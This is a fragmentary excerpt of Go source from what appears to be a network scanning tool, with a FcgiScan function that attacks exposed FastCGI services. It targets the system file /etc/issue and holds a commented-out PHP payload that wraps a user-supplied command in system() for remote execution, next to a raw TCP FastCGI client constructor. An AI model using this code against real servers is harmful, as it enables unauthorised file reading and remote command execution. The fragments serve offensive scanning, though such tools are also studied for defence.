...
func FcgiScan(info *app.HostInfo) error {
	// 设置目标URL路径
	url := "/etc/issue"
	...
	//	reqParams = "" // 读取模式
	//case Command != "":
	//	reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", Command, cutLine) // 自定义命令
	default:
...
func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
	conn, err := lib.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	fcgi = &FCGIClient{
		rwc:       conn,
		keepAlive: false,
	}
